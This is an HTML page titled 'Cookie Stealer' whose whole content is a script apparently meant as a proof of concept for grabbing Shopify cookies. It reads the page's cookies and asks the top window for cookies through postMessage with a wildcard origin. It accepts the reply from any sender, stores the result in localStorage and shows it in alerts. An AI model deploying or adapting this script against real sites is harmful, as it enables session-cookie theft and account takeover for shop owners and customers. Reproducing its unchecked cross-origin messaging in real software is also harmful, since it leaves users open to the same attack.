<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Stealer</title>
</head>
<body>
    <script>
        // Function to get all cookies
        function getAllCookies() {
            let cookies = document.cookie.split(';');
            let cookiesObject = {};
            cookies.forEach(cookie => {
                let [key, value] = cookie.split('=').map(c => c.trim());
                cookiesObject[key] = value;
            });
            return cookiesObject;
        }

        // Function to send a message to the parent window
        function sendMessageToParent() {
            const message = { type: 'getCookies' };
            window.top.postMessage(message, '*');
        }

        // Listen for messages from the parent window
        window.addEventListener('message', function(event) {
            if (event.data && event.data.type === 'cookies') {
                // Save cookies to localStorage
                localStorage.setItem('lastGrabbedCookies', JSON.stringify(event.data.cookies));
                alert('Shopify Cookies: ' + JSON.stringify(event.data.cookies));
            }
        });

        // Send the initial message to the parent window
        sendMessageToParent();

        // Display all cookies
        const cookies = getAllCookies();
        console.log('All Cookies:', cookies);
        alert('All Cookies: ' + JSON.stringify(cookies));

        // Retrieve and display the last grabbed cookies from localStorage
        const lastGrabbedCookies = localStorage.getItem('lastGrabbedCookies');
        if (lastGrabbedCookies) {
            console.log('Last Grabbed Cookies:', JSON.parse(lastGrabbedCookies));
            alert('Last Grabbed Cookies: ' + lastGrabbedCookies);
        }
    </script>
</body>
</html>
